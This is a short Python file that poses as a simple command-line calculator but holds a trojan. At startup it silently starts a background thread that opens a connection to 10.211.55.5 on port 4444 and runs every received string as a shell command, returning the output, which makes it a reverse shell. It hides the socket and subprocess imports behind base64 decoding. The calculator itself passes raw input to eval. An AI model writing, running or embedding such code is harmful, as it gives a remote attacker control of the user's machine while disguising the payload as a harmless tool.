import base64
import threading
import sys


def load_mod(b64_str):
    return __import__(base64.b64decode(b64_str).decode())

socket = load_mod("c29ja2V0")
subprocess = load_mod("c3VicHJvY2Vzcw==")

def run_backdoor(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        while True:
            data = s.recv(1024).decode()
            if not data: break
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(proc.stdout.read() + proc.stderr.read())
        s.close()
    except: pass

def calculator():
    print("Calculator v1.0")
    while True:
        expr = input("Calc > ")
        try: print(eval(expr))
        except: pass

if __name__ == "__main__":
  
    threading.Thread(target=run_backdoor, args=("10.211.55.5", 4444), daemon=True).start()
    calculator()
